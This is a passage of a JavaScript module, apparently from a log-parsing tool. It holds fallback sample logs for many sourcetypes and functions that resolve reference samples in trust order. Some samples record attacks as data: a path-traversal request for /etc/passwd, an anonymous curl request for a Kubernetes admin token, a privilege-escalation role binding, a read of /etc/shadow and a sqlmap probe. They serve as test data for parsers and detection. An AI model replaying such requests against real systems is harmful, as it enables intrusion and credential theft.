    '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","auditID":"abc-123-def","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/default/pods","verb":"create","user":{"username":"system:serviceaccount:default:deployer","uid":"abc-uid","groups":["system:serviceaccounts","system:authenticated"]},"sourceIPs":["10.0.1.50"],"userAgent":"kubectl/v1.28.0","objectRef":{"resource":"pods","namespace":"default","name":"nginx-deployment-abc123","apiVersion":"v1"},"responseStatus":{"metadata":{},"code":201},"requestReceivedTimestamp":"2024-03-15T10:30:00.000000Z","stageTimestamp":"2024-03-15T10:30:00.050000Z"}',
    '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","auditID":"def-456-ghi","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/kube-system/secrets/admin-token","verb":"get","user":{"username":"system:anonymous","groups":["system:unauthenticated"]},"sourceIPs":["203.0.113.50"],"userAgent":"curl/7.68.0","objectRef":{"resource":"secrets","namespace":"kube-system","name":"admin-token","apiVersion":"v1"},"responseStatus":{"metadata":{},"code":403},"requestReceivedTimestamp":"2024-03-15T11:00:00.000000Z","stageTimestamp":"2024-03-15T11:00:00.010000Z"}',
    '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"ghi-789-jkl","stage":"ResponseComplete","requestURI":"/apis/apps/v1/namespaces/production/deployments/web-app","verb":"patch","user":{"username":"admin@company.com","groups":["system:masters","system:authenticated"]},"sourceIPs":["10.0.0.25"],"userAgent":"kubectl/v1.28.0","objectRef":{"resource":"deployments","namespace":"production","name":"web-app","apiGroup":"apps","apiVersion":"v1"},"responseStatus":{"metadata":{},"code":200},"requestReceivedTimestamp":"2024-03-15T12:15:00.000000Z","stageTimestamp":"2024-03-15T12:15:00.100000Z"}',
    '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","auditID":"jkl-012-mno","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/default/pods/suspicious-pod/exec","verb":"create","user":{"username":"developer@company.com","groups":["developers","system:authenticated"]},"sourceIPs":["10.0.3.100"],"userAgent":"kubectl/v1.28.0","objectRef":{"resource":"pods","subresource":"exec","namespace":"default","name":"suspicious-pod","apiVersion":"v1"},"responseStatus":{"metadata":{},"code":101},"requestReceivedTimestamp":"2024-03-15T14:30:00.000000Z","stageTimestamp":"2024-03-15T14:30:00.200000Z"}',
    '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","auditID":"mno-345-pqr","stage":"ResponseComplete","requestURI":"/apis/rbac.authorization.k8s.io/v1/clusterrolebindings","verb":"create","user":{"username":"attacker","groups":["system:authenticated"]},"sourceIPs":["198.51.100.75"],"userAgent":"python-requests/2.28.0","objectRef":{"resource":"clusterrolebindings","name":"privilege-escalation","apiGroup":"rbac.authorization.k8s.io","apiVersion":"v1"},"responseStatus":{"metadata":{},"code":201},"requestReceivedTimestamp":"2024-03-15T16:00:00.000000Z","stageTimestamp":"2024-03-15T16:00:00.050000Z"}',
  ],
  azure_ad_audit: [
    '{"time":"2024-03-15T10:30:00Z","resourceId":"/tenants/abc-123/providers/Microsoft.aadiam","operationName":"Update user","operationVersion":"1.0","category":"AuditLogs","tenantId":"abc-123-def-456","resultType":"Success","resultSignature":"None","durationMs":250,"callerIpAddress":"10.0.1.50","correlationId":"corr-abc-123","identity":"admin@company.com","level":"Informational","properties":{"id":"dir-abc-123","category":"UserManagement","result":"success","activityDisplayName":"Update user","loggedByService":"Core Directory","operationType":"Update","initiatedBy":{"user":{"id":"user-id-123","displayName":"Admin User","userPrincipalName":"admin@company.com","ipAddress":"10.0.1.50"}},"targetResources":[{"id":"target-user-id","displayName":"John Doe","type":"User","userPrincipalName":"john.doe@company.com","modifiedProperties":[{"displayName":"AccountEnabled","oldValue":"true","newValue":"false"}]}]}}',
    '{"time":"2024-03-15T11:00:00Z","resourceId":"/tenants/abc-123/providers/Microsoft.aadiam","operationName":"Add member to role","operationVersion":"1.0","category":"AuditLogs","tenantId":"abc-123-def-456","resultType":"Success","durationMs":180,"callerIpAddress":"198.51.100.50","correlationId":"corr-def-456","identity":"attacker@company.com","level":"Informational","properties":{"id":"dir-def-456","category":"RoleManagement","result":"success","activityDisplayName":"Add member to role","loggedByService":"Core Directory","operationType":"Assign","initiatedBy":{"user":{"id":"attacker-id","displayName":"Suspicious User","userPrincipalName":"attacker@company.com","ipAddress":"198.51.100.50"}},"targetResources":[{"id":"role-id-globaladmin","displayName":"Global Administrator","type":"Role"}]}}',
    '{"time":"2024-03-15T09:15:00Z","resourceId":"/tenants/abc-123/providers/Microsoft.aadiam","operationName":"Add application","operationVersion":"1.0","category":"AuditLogs","tenantId":"abc-123-def-456","resultType":"Success","durationMs":320,"callerIpAddress":"10.0.2.25","correlationId":"corr-ghi-789","identity":"developer@company.com","level":"Informational","properties":{"id":"dir-ghi-789","category":"ApplicationManagement","result":"success","activityDisplayName":"Add application","loggedByService":"Core Directory","operationType":"Add","initiatedBy":{"user":{"id":"dev-id-123","displayName":"Developer","userPrincipalName":"developer@company.com"}},"targetResources":[{"id":"app-id-new","displayName":"New Internal App","type":"Application"}]}}',
    '{"time":"2024-03-15T14:45:00Z","resourceId":"/tenants/abc-123/providers/Microsoft.aadiam","operationName":"Reset user password","operationVersion":"1.0","category":"AuditLogs","tenantId":"abc-123-def-456","resultType":"Success","durationMs":200,"callerIpAddress":"10.0.1.100","correlationId":"corr-jkl-012","identity":"helpdesk@company.com","level":"Informational","properties":{"id":"dir-jkl-012","category":"UserManagement","result":"success","activityDisplayName":"Reset password (by admin)","loggedByService":"Core Directory","operationType":"Update","initiatedBy":{"user":{"id":"helpdesk-id","displayName":"Help Desk","userPrincipalName":"helpdesk@company.com"}},"targetResources":[{"id":"reset-user-id","displayName":"Employee Smith","type":"User","userPrincipalName":"smith@company.com"}]}}',
    '{"time":"2024-03-15T16:30:00Z","resourceId":"/tenants/abc-123/providers/Microsoft.aadiam","operationName":"Delete user","operationVersion":"1.0","category":"AuditLogs","tenantId":"abc-123-def-456","resultType":"Failure","resultDescription":"Insufficient privileges","durationMs":50,"callerIpAddress":"203.0.113.10","correlationId":"corr-mno-345","identity":"external@partner.com","level":"Informational","properties":{"id":"dir-mno-345","category":"UserManagement","result":"failure","activityDisplayName":"Delete user","loggedByService":"Core Directory","operationType":"Delete","initiatedBy":{"user":{"id":"external-id","displayName":"External Partner","userPrincipalName":"external@partner.com","ipAddress":"203.0.113.10"}},"targetResources":[{"id":"target-exec-id","displayName":"CEO","type":"User","userPrincipalName":"ceo@company.com"}]}}',
  ],
  cisco_esa: [
    'Mon Jan 15 10:23:45 2024 Info: New SMTP ICID 4501234 interface InboundMail (10.0.1.5) address 198.51.100.10 reverse dns host mail.partner.com verified yes',
    'Mon Jan 15 10:23:46 2024 Info: Start MID 8901234 ICID 4501234',
    'Mon Jan 15 10:23:47 2024 Info: MID 8901234 ICID 4501234 From: <sender@partner.com>',
    'Mon Jan 15 10:23:48 2024 Info: MID 8901234 ICID 4501234 RID 0 To: <user@company.com>',
    'Mon Jan 15 10:23:49 2024 Info: MID 8901234 Message-ID \'<abc123def456@mail.partner.com>\'',
    'Mon Jan 15 10:23:50 2024 Info: MID 8901234 Subject \'Quarterly Report Q4\'',
    'Mon Jan 15 10:23:51 2024 Info: MID 8901234 ready 45678 bytes from <sender@partner.com>',
    'Mon Jan 15 10:23:52 2024 Info: MID 8901234 matched all recipients for per-recipient policy DEFAULT in the inbound table',
    'Mon Jan 15 10:23:53 2024 Info: MID 8901234 AntiVirus negative',
    'Mon Jan 15 10:23:54 2024 Info: MID 8901234 AMP file reputation verdict: FILE UNKNOWN',
    'Mon Jan 15 10:23:55 2024 Info: MID 8901234 interim verdict using engine: CASE spam negative',
    'Mon Jan 15 10:23:56 2024 Info: MID 8901234 using engine: CASE spam negative',
    'Mon Jan 15 10:23:57 2024 Info: MID 8901234 Outbreak Filters: verdict negative',
    'Mon Jan 15 10:23:58 2024 Info: MID 8901234 queued for delivery',
    'Mon Jan 15 10:24:01 2024 Info: Delivery start DCID 7801234 MID 8901234 to RID [0]',
    "Mon Jan 15 10:24:02 2024 Info: Message done DCID 7801234 MID 8901234 to RID [0] [('250 2.0.0 OK')]",
    "Mon Jan 15 10:24:03 2024 Info: MID 8901234 RID [0] Response '250 2.0.0 OK'",
    "Mon Jan 15 10:24:10 2024 Warning: MID 8901235 ICID 4501235 RID 0 To: <finance@company.com> - 5.1.0 - Unknown address error 550-'5.1.1 The email account does not exist'",
    'Mon Jan 15 10:24:30 2024 Info: ICID 4501234 close',
  ],
  linux_syslog: [
    'May  6 17:24:00 ubuntu kernel: [  801.664268] NET: Registered PF_ALG protocol family',
    'May  6 17:24:01 web-srv-01 sshd[12345]: Accepted publickey for admin from 10.0.1.50 port 54321 ssh2: RSA SHA256:abcdef1234567890',
    'May  6 17:25:12 db-srv-02 sudo:  operator : TTY=pts/0 ; PWD=/home/operator ; USER=root ; COMMAND=/usr/bin/systemctl restart postgresql',
    'May  6 17:26:30 fw-01 audit[6789]: USER_AUTH pid=6789 uid=0 auid=1000 ses=42 msg=\'op=PAM:authentication grantors=pam_unix acct="admin" exe="/usr/sbin/sshd" hostname=10.0.1.50 addr=10.0.1.50 terminal=ssh res=success\'',
    'May  6 17:27:45 app-srv-03 systemd[1]: Started Docker Application Container Engine.',
  ],
  // --- *nix /var/log families (see resolveLinuxFamily). Real formats, distinct
  // per family so each stops colliding on the shared syslog-linux sample. ---
  // RHEL/Fedora DNF package manager transaction log (/var/log/dnf.log).
  linux_dnf: [
    '2024-05-06T09:14:22+0000 INFO --- logging initialized ---',
    '2024-05-06T09:14:22+0000 DDEBUG timer: config: 4 ms',
    '2024-05-06T09:14:23+0000 INFO Command: dnf -y update',
    '2024-05-06T09:14:23+0000 INFO Installed: kernel-core-5.14.0-427.13.1.el9_4.x86_64',
    '2024-05-06T09:14:25+0000 INFO Upgraded: openssl-1:3.0.7-27.el9.x86_64',
    '2024-05-06T09:14:26+0000 INFO Removed: kernel-core-5.14.0-362.24.1.el9_3.x86_64',
    '2024-05-06T09:14:26+0000 DDEBUG Cleaning up.',
  ],
  // DNF librepo (repo/metadata download) log (/var/log/dnf.librepo.log).
  linux_dnf_librepo: [
    '2024-05-06T09:14:22+0000 DEBUG Librepo version: 1.14.5 with libcurl/7.76.1 OpenSSL/3.0.7 zlib/1.2.11',
    '2024-05-06T09:14:22+0000 INFO Downloading: https://cdn.example.com/rhel/9/x86_64/repodata/repomd.xml',
    '2024-05-06T09:14:23+0000 DEBUG Target: repomd.xml (https://cdn.example.com/rhel/9/x86_64/repodata/repomd.xml)',
    '2024-05-06T09:14:23+0000 DEBUG Downloaded: repomd.xml (effective url: https://cdn.example.com/rhel/9/x86_64/repodata/repomd.xml)',
    '2024-05-06T09:14:24+0000 INFO Downloading: primary.xml.gz - 2451233 bytes',
    '2024-05-06T09:14:25+0000 DEBUG Successfully downloaded (checksum OK): primary.xml.gz',
  ],
  // DNF RPM transaction log (/var/log/dnf.rpm.log) - scriptlet/verify output.
  linux_dnf_rpm: [
    '2024-05-06T09:14:24+0000 SUBDEBUG Upgrade: openssl-1:3.0.7-27.el9.x86_64',
    '2024-05-06T09:14:24+0000 INFO warning: /etc/ssl/openssl.cnf created as /etc/ssl/openssl.cnf.rpmnew',
    '2024-05-06T09:14:25+0000 SUBDEBUG Installed: kernel-core-5.14.0-427.13.1.el9_4.x86_64',
    '2024-05-06T09:14:25+0000 DDEBUG Running scriptlet: kernel-core-5.14.0-427.13.1.el9_4.x86_64',
    '2024-05-06T09:14:26+0000 SUBDEBUG Cleanup: openssl-1:3.0.7-24.el9.x86_64',
  ],
  // Kernel ring buffer (dmesg / /var/log/kern.log) - syslog framing, kernel facility.
  linux_kernel: [
    'May  6 17:24:00 web01 kernel: [80211.664268] e1000e: eth0 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: Rx/Tx',
    'May  6 17:24:03 web01 kernel: [80214.112900] EXT4-fs (sda1): mounted filesystem with ordered data mode. Opts: (null)',
    'May  6 17:25:11 web01 kernel: [80282.554013] TCP: request_sock_TCP: Possible SYN flooding on port 443. Sending cookies.',
    'May  6 17:26:40 web01 kernel: [80371.998210] Out of memory: Killed process 24187 (java) total-vm:4194304kB, anon-rss:2097152kB',
    'May  6 17:27:02 web01 kernel: [80393.220145] audit: type=1400 audit(1715016422.220:42): apparmor="DENIED" operation="open" profile="/usr/sbin/nginx" name="/etc/shadow" pid=4501 comm="nginx"',
    'May  6 17:28:15 web01 kernel: [80466.771003] nf_conntrack: nf_conntrack: table full, dropping packet',
  ],
  // Postfix/sendmail mail log (/var/log/maillog).
  linux_maillog: [
    'May  6 17:24:00 mail01 postfix/smtpd[24187]: connect from mail.partner.com[198.51.100.10]',
    'May  6 17:24:01 mail01 postfix/smtpd[24187]: 4A2F1C0A87: client=mail.partner.com[198.51.100.10]',
    'May  6 17:24:01 mail01 postfix/cleanup[24190]: 4A2F1C0A87: message-id=<abc123@partner.com>',
    'May  6 17:24:02 mail01 postfix/qmgr[1123]: 4A2F1C0A87: from=<sender@partner.com>, size=45231, nrcpt=1 (queue active)',
    'May  6 17:24:03 mail01 postfix/smtp[24192]: 4A2F1C0A87: to=<user@company.com>, relay=10.0.1.20[10.0.1.20]:25, delay=2.1, delays=0.5/0/0.3/1.3, dsn=2.0.0, status=sent (250 2.0.0 OK)',
    'May  6 17:24:04 mail01 postfix/qmgr[1123]: 4A2F1C0A87: removed',
    'May  6 17:25:30 mail01 postfix/smtpd[24187]: NOQUEUE: reject: RCPT from unknown[203.0.113.55]: 554 5.7.1 <spam@evil.com>: Relay access denied; from=<spam@evil.com> to=<user@company.com>',
  ],
  // Generic /var/log/messages - mixed daemon syslog (systemd, dhclient, chronyd, kernel).
  linux_messages: [
    'May  6 17:24:00 host01 systemd[1]: Starting Cleanup of Temporary Directories...',
    'May  6 17:24:00 host01 systemd[1]: Started Cleanup of Temporary Directories.',
    'May  6 17:24:05 host01 dhclient[1244]: DHCPACK from 10.0.1.1 (xid=0x3a2b1c4d)',
    'May  6 17:24:05 host01 dhclient[1244]: bound to 10.0.1.50 -- renewal in 1623 seconds.',
    'May  6 17:25:10 host01 chronyd[988]: Selected source 10.0.1.1',
    'May  6 17:26:22 host01 systemd-logind[1002]: New session 42 of user deploy.',
    'May  6 17:27:45 host01 kernel: usb 1-1: new high-speed USB device number 4 using ehci-pci',
  ],
  // /var/log/secure - authentication/authorization (sshd, sudo, PAM).
  linux_secure: [
    'May  6 17:24:01 host01 sshd[24312]: Accepted publickey for deploy from 10.7.42.19 port 51234 ssh2: RSA SHA256:3n8Xq9k2Lm4pR7vT1yZ',
    'May  6 17:24:01 host01 sshd[24312]: pam_unix(sshd:session): session opened for user deploy by (uid=0)',
    'May  6 17:24:33 host01 sshd[24418]: Failed password for invalid user admin from 203.0.113.55 port 44921 ssh2',
    'May  6 17:24:35 host01 sshd[24418]: Disconnected from invalid user admin 203.0.113.55 port 44921 [preauth]',
    'May  6 17:25:02 host01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx',
    'May  6 17:25:02 host01 sudo: pam_unix(sudo:session): session opened for user root by deploy(uid=1000)',
    'May  6 17:25:03 host01 sudo: pam_unix(sudo:session): session closed for user root',
  ],
  // syslog-ng internal / relayed daemon log.
  linux_syslogng: [
    'May  6 17:24:00 relay01 syslog-ng[1088]: syslog-ng starting up; version=\'3.35.1\'',
    'May  6 17:24:00 relay01 syslog-ng[1088]: Configuration reload request received, reloading configuration;',
    'May  6 17:24:01 relay01 syslog-ng[1088]: Syslog connection established; fd=\'12\', server=\'AF_INET(10.0.1.20:514)\', local=\'AF_INET(0.0.0.0:0)\'',
    'May  6 17:25:10 relay01 syslog-ng[1088]: Error connecting to remote host; server=\'AF_INET(10.0.1.99:514)\', error=\'Connection refused (111)\'',
    'May  6 17:26:00 relay01 syslog-ng[1088]: Destination queue full, dropping messages; queue_len=\'10000\', mem_fifo_size=\'10000\'',
  ],
  // `df` filesystem-usage scripted input (Splunk *nix TA df.sh) - columnar.
  unix_df: [
    'Filesystem    Type   1024-blocks      Used  Available Capacity Mounted on',
    '/dev/sda1     xfs       52403200  28112044   24291156      54% /',
    '/dev/sda2     xfs      104806400  71234560   33571840      68% /var',
    'tmpfs         tmpfs      8127040         0    8127040       0% /dev/shm',
    '/dev/sdb1     ext4     209612800 198234112   11378688      95% /data',
  ],
  // `ps` process-listing scripted input (Splunk *nix TA ps.sh) - columnar.
  unix_ps: [
    'USER       PID  %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND',
    'root         1   0.0  0.1 168132 11460 ?        Ss   May05   0:12 /usr/lib/systemd/systemd --switched-root --system',
    'root       988   0.0  0.0  95212  4188 ?        Ssl  May05   0:03 /usr/sbin/chronyd -F 2',
    'deploy   24187   3.2  8.4 4194304 2097152 ?     Sl   17:20   1:45 /usr/bin/java -Xmx2g -jar app.jar',
    'postfix   1123   0.0  0.1  91324  7220 ?        S    May05   0:00 qmgr -l -t unix -u',
  ],
  // --- Golden-path seeds for buildable sourcetypes that had no static sample and
  // were AI-seeded (report flagged the AI content). A deterministic seed routes
  // these to their parser+golden CIM path. Keyed by CANONICAL name; the raw
  // sourcetype is mapped to the canonical via FALLBACK_KEY_ALIASES below. ---
  f5_bigip: [
    '<134>Jan 12 14:22:31 ltm01 tmm[6789]: 01260013:5: SSL Handshake failed for TCP 10.20.30.40:52344 -> 172.16.8.9:443',
    '<134>Jan 12 14:22:33 ltm01 tmm1[6789]: 01260009:5: Connection error: ssl_hs_rxhello:9308: version mismatch (10.20.30.41:51002)',
    '<133>Jan 12 14:22:35 ltm01 mcpd[5544]: 01070417:5: AUDIT - pid=5544 user=admin folder=/Common module=tmsh status=[Command OK] cmd_data=list ltm virtual',
    '<134>Jan 12 14:22:40 ltm01 tmm2[6789]: 01260026:5: No shared ciphers between SSL peers 10.20.30.42:60122 -> 172.16.8.9:443',
    '<133>Jan 12 14:22:44 ltm01 logger[7001]: Rule /Common/irule_redirect <HTTP_REQUEST>: redirecting 10.20.30.43 to https://portal.acme.local/',
  ],
  infoblox_port: [
    'Jan 12 14:30:01 infoblox-gm named[1123]: client 10.10.5.22#53812: query: www.acme.local IN A + (10.10.5.1)',
    'Jan 12 14:30:03 infoblox-gm dhcpd[2244]: DHCPACK on 10.10.20.55 to 00:0c:29:aa:bb:cc (WKS-2210) via eth1',
    'Jan 12 14:30:05 infoblox-gm named[1123]: client 10.10.5.23#41022: query: malware-c2.example.net IN AAAA + (10.10.5.1)',
    'Jan 12 14:30:07 infoblox-gm dhcpd[2244]: DHCPREQUEST for 10.10.20.56 from 00:0c:29:dd:ee:ff via eth1',
    'Jan 12 14:30:09 infoblox-gm named[1123]: client 10.10.5.24#50110: query: update.microsoft.com IN A + (10.10.5.1)',
  ],
  apache_access: [
    '203.0.113.24 - - [12/Jan/2025:14:35:02 +0000] "GET /index.html HTTP/1.1" 200 4523 "https://acme.local/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"',
    '198.51.100.7 - - [12/Jan/2025:14:35:04 +0000] "POST /api/login HTTP/1.1" 302 0 "https://acme.local/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"',
    '203.0.113.98 - jdoe [12/Jan/2025:14:35:07 +0000] "GET /dashboard HTTP/1.1" 200 18234 "https://acme.local/api/login" "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"',
    '192.0.2.44 - - [12/Jan/2025:14:35:10 +0000] "GET /admin/../../etc/passwd HTTP/1.1" 404 199 "-" "curl/8.4.0"',
    '198.51.100.203 - - [12/Jan/2025:14:35:12 +0000] "GET /images/logo.png HTTP/1.1" 304 0 "https://acme.local/index.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"',
  ],
  // Generic, vendor-agnostic ArcSight/Micro Focus CEF (Common Event Format).
  // Spans the shapes a real CEF stream mixes: BSD-syslog-wrapped and bare,
  // numeric AND textual severity, translated (NAT) addresses, custom
  // cs*/cn*+Label fields, and file/hash extension keys — every extension key
  // this covers is a real entry in the published CEF Key Dictionary.
  cef: [
    '<134>Jan 12 14:35:02 fw01.acme.local CEF:0|Acme Networks|NextGen Firewall|9.2.1|100|Traffic Allowed|5|rt=1736692502000 src=10.1.1.15 spt=52341 dst=8.8.8.8 dpt=443 proto=TCP act=allow app=https in=2048 out=10240 suser=jdoe sourceTranslatedAddress=203.0.113.10 sourceTranslatedPort=41022 cs1Label=Rule cs1=allow-web-outbound cn1Label=RuleId cn1=42',
    'CEF:0|Acme Networks|NextGen Firewall|9.2.1|200|Login Failed|Medium|rt=1736692510000 src=198.51.100.7 suser=alice duser=alice act=login-failed outcome=failure reason=Invalid+credentials cs2Label=AuthMethod cs2=LDAP',
    '<13>1 2025-01-12T14:35:15.000Z ids02.acme.local eventgen 4021 ID47 - CEF:0|Acme Security|Network IDS|3.4.0|5001|Malware Callback Detected|Very-High|rt=1736692515000 src=10.1.2.44 spt=49213 dst=203.0.113.99 dpt=443 proto=TCP dvc=10.1.2.1 dvchost=ids02.acme.local cat=intrusion cs3Label=ThreatFamily cs3=Emotet cn2Label=ConfidenceScore cn2=93',
    'CEF:0|Acme Mail|Secure Email Gateway|5.1.0|3010|Malicious Attachment Blocked|High|rt=1736692520000 suser=bob@acme.local duser=carol@acme.local msg=Attachment+blocked+by+AV+engine fname=invoice.exe filePath=/quarantine/2025/01/12/ fileHash=44d88612fea8a8f36de82e1278abb02f act=quarantine',
    '<134>Jan 12 14:35:25 waf01 CEF:0|Acme Networks|Web Application Firewall|2.7.3|7002|SQL Injection Attempt Blocked|9|rt=1736692525000 src=192.0.2.44 spt=51234 dst=10.1.3.10 dpt=8443 requestMethod=POST request=https://app.acme.local/api/search requestClientApplication=sqlmap/1.7 act=blocked outcome=success',
  ],
};

// Raw sourcetype (as the wizard sends it) → canonical FALLBACK_SAMPLES key. Only
// for buildable golden-path sources whose seeds are keyed canonically above; lets
// the fbKey lookup reach the seed without touching sourcetype canonicalization.
const FALLBACK_KEY_ALIASES = {
  'f5:bigip:syslog': 'f5_bigip',
  'f5_bigip_syslog': 'f5_bigip',
  'access_combined': 'apache_access',
  'access_combined_wcookie': 'apache_access',
  'access_log': 'apache_access',
  'apache_access': 'apache_access',
  'infoblox:port': 'infoblox_port',
};

let _sourceSamplesCache = null;
function loadSourceSamples() {
  if (_sourceSamplesCache) return _sourceSamplesCache;
  if (!existsSync(SOURCE_SAMPLES_PATH)) return null;
  try { _sourceSamplesCache = JSON.parse(readFileSync(SOURCE_SAMPLES_PATH, 'utf-8')); } catch { return null; }
  return _sourceSamplesCache;
}

const _jsonIndexCache = {};
function loadJsonIndex(relPath) {
  if (relPath in _jsonIndexCache) return _jsonIndexCache[relPath];
  const p = join(CONFIG_DIR, relPath);
  let value = null;
  if (existsSync(p)) { try { value = JSON.parse(readFileSync(p, 'utf-8')); } catch { value = null; } }
  _jsonIndexCache[relPath] = value;
  return value;
}

export function getSourceSampleFallback(st) {
  const samples = loadSourceSamples();
  if (!samples) return null;
  // Entries our own parser cannot read are skipped, not served: this store
  // outranks every later tier, so a broken entry shadows the good sample behind
  // it and the pack silently extracts nothing (src/sample-library.ts).
  const usable = (k, entry) => entry?.example_logs?.length && !UNREADABLE_SOURCE_SAMPLES.has(k);
  const key = st.replace(/:/g, '_');
  for (const k of [st, key]) {
    const entry = samples[k];
    if (usable(k, entry)) {
      return { available: true, events: entry.example_logs, sourcetype: entry.sourcetype || st, pack: 'source-samples', fields: entry.fields || [], sampleName: `${st}_reference` };
    }
  }
  const aliases = SOURCETYPE_ALIASES[st];
  if (aliases) {
    for (const alias of aliases) {
      const aKey = alias.replace(/:/g, '_');
      for (const k of [alias, aKey]) {
        const aEntry = samples[k];
        if (usable(k, aEntry)) {
          return { available: true, events: aEntry.example_logs, sourcetype: aEntry.sourcetype || st, pack: 'source-samples', fields: aEntry.fields || [], sampleName: `${st}_reference` };
        }
      }
    }
  }
  return null;
}

/**
 * The fallback tier chain, in trust order. This used to be five hand-copied
 * two-tier blocks inside handleReferenceSample; adding the AI-sample tier to only
 * four of five would have made resolution depend on WHICH way the catalog lookup
 * missed, so it is one function now.
 *
 *   1. FALLBACK_SAMPLES        curated static seeds (real wire formats, hand-checked)
 *   2. source-samples.json     real vendor logs, hand-curated set
 *   3. the samples pool       real vendor logs harvested from an upstream corpus
 *   4. config/sanitised-samples/ pseudonymised, parser-verified real wire formats
 *   5. config/ai-samples/      verified AI-generated  ← synthetic, so it goes last
 *
 * Real data always wins: a generated sample can never shadow a real one. Tier 3
 * sits under tier 2 because those 80-odd samples were curated by hand for exactly
 * our parsers, while a harvested one is only as good as its gate said it was.
 * Mirrored by `getBundledReferenceSample` in src/bundled-data.ts (Hard Rule 18).
 *
 * ASYNC because of tier 3 alone: the harvested bodies live in the samples pool
 * rather than in `config/`, read through a disk cache (src/samples-pool.ts). Every
 * other tier is still a synchronous disk read, and a pool failure returns null so
 * resolution falls straight through — the chain never depends on the network.
 */
export async function resolveFallbackSample(st, format) {
  if (FALLBACK_SAMPLES[st]) {
    return { available: true, events: FALLBACK_SAMPLES[st], sourcetype: st, pack: 'fallback', fields: [], sampleName: `${st}_fallback` };
  }
  const refFallback = getSourceSampleFallback(st);
  if (refFallback) return refFallback;
  const vendor = toVendorReferenceResponse(await getVendorLibrarySample(st, format));
  if (vendor) return vendor;
  const sanitised = toSanitisedReferenceResponse(getSanitisedLibrarySampleSync(st, format));
  if (sanitised) return sanitised;
  const ai = toReferenceResponse(getAiLibrarySample(st, format));
  if (ai) return ai;
  return { available: false };
}

/**
 * The sample one `reference-sample` request resolves to, as a plain payload.
 *
 * Factored OUT of `handleReferenceSample` (which is now a thin req/res wrapper)
 * so a maintainer script can resolve a sample the same way the running app does
 * — `scripts/build-source-ocsf-samples.mjs` needs one sample per sourcetype and
 * must not re-implement the catalog lookup, the *nix/Windows routers, the
 * FALLBACK_KEY_ALIASES mapping or the thin-sample swap. A second copy of this
 * ordering would decide differently from the app and the artifact would no
 * longer describe what a build actually produces.
 */
/**
 * Every REAL sample the local stores hold for a sourcetype — one entry per store
 * document, tier-labelled with the golden-trust ladder: the curated seed, the
 * hand-curated vendor log, each catalog pack sample, the sanitised library.
 *
 * Feeds the golden HOLDOUT (scripts/golden-holdout.mjs), so two tiers are left out
 * on purpose: `config/ai-samples/` (a golden graded on a model-written sample only
 * proves it agrees with the model) and the samples pool (network — the holdout runs
 * in CI and must be offline and deterministic). Events are returned as stored; the
 * caller flattens them to lines.
 */
export function listRealLocalSamples(sourcetype) {
  const st = (sourcetype || '').toLowerCase().trim();
  if (!st) return [];
  const fbKey = FALLBACK_KEY_ALIASES[st] || st;
  const out = [];
  if (FALLBACK_SAMPLES[fbKey]) out.push({ tier: 'curated', source: `fallback:${fbKey}`, events: FALLBACK_SAMPLES[fbKey] });
  const vendor = getSourceSampleFallback(fbKey);
  if (vendor?.events?.length) out.push({ tier: 'vendor', source: `source-samples:${fbKey}`, events: vendor.events });
  const catalog = loadCatalog();
  if (catalog) {
    for (const { entry } of resolveEntries(st, catalog)) {
      for (const sample of entry.samples || []) {
        try {
          const events = JSON.parse(readFileSync(join(SAMPLE_LIB, sample.file), 'utf-8'));
          const list = Array.isArray(events) ? events : [events];
          if (list.length) out.push({ tier: 'vendor', source: `catalog:${sample.file}`, events: list });
        } catch { /* unreadable catalog file: not a sample */ }
      }
    }
  }
  const sanitised = toSanitisedReferenceResponse(getSanitisedLibrarySampleSync(fbKey));
  if (sanitised?.events?.length) out.push({ tier: 'sanitised', source: `sanitised:${fbKey}`, events: sanitised.events });
  return out;
}

export async function resolveReferenceSample(sourcetype, format) {
  // XSIAM's asserted CEF contract outranks a native-format catalog sample.
  // Without this branch FortiGate `format=cef` still returned KVP because the
  // old resolver only narrowed the lowest-priority AI sample tier.
  if (String(format || '').toLowerCase() === 'cef') {
    const xsiamCef = getXsiamCefSample(sourcetype);
    if (xsiamCef) return xsiamCef;
  }
  const catalog = loadCatalog();
  if (!catalog) {
    // No catalog at all — try fallback
    return await resolveFallbackSample((sourcetype || '').toLowerCase().trim(), format);
  }
  const stNorm = (sourcetype || '').toLowerCase().trim();
  // *nix family routing takes precedence for bare /var/log names; Windows channel
  // routing for wineventlog channels. Both are RAW-string routers (not canonical).
  const linuxFamily = resolveLinuxFamily(stNorm);
  const channel = linuxFamily ? null : resolveWindowsChannel(stNorm);
  const route = linuxFamily || channel;
  let matches = route ? resolveEntriesByPatterns(route.patterns, catalog) : resolveEntries(sourcetype, catalog);
  // If a Windows channel produced no loadable catalog sample, fall back to its
  // default canonical resolution (generic Security). *nix families deliberately
  // resolve via FALLBACK_SAMPLES only (patterns:[]) — never default to Windows.
  if (channel && !matches.some(m => (m.entry.samples || []).length > 0)) {
    matches = resolveEntries(channel.fallback || 'windows_security', catalog);
  }
  // Key for FALLBACK_SAMPLES / source-samples lookups when no catalog file loads.
  // FALLBACK_KEY_ALIASES maps a raw sourcetype (f5:bigip:syslog, access_combined)
  // to the canonical FALLBACK_SAMPLES seed key so buildable golden sources reach
  // their deterministic seed instead of falling to AI.
  const rawFbKey = (route?.fallback || sourcetype || '').toLowerCase().trim();
  const fbKey = FALLBACK_KEY_ALIASES[rawFbKey] || rawFbKey;
  const merged = mergeEntries(matches);
